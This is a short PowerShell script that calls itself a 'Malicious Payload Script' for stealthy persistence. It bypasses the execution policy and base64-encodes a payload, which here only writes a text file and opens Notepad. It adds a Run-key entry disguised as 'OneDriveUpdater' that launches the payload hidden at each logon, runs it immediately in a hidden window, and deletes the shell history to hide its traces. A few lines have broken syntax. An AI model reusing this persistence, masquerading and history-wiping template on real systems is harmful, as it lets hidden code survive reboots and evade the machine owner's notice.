#Set the ExecutionPolicy to ensure that PowerShell scripts are allowed to run
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force

# Malicious Payload Script - stealthy persistence
$payload = "Set-Content -Path `"$env:TEMP\sysinfo.txt`" -Value `"Hello again Old Friend`"; Start-Process notepad `"$env:TEMP\sysinfo.txt`""
$bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
$encodedPayload = [Convert]::ToBase64String($bytes)

Write-Host $encodedPayload

# Persistence via Registry (Stealthy) New-ItemProperty -Path "HKCU:
# Define the registry path
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

# Define the registry entry name
$entryName = "OneDriveUpdater"


# Define the program to run (powershell.exe)
$entryValue = "powershell.exe -NoProfile -windowstyle hidden -EncodedCommand $encodedPayload"

# Ensure the registry path exists
If (-Not (Test-Path $regPath)) {
    New-Item -Path $regPath -Force | Out-Null
}

# Create the registry entry
New-ItemProperty -Path $regPath -Name $entryName -Value $entryValue -PropertyType String - Force

# Execute payload immediately (stealthily)
Start-Process -WindowStyle Hidden powershell.exe "-nop -encodedcommand
$encodedPayload"

# Clear history (OPSEC cleanup) Clear-History
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
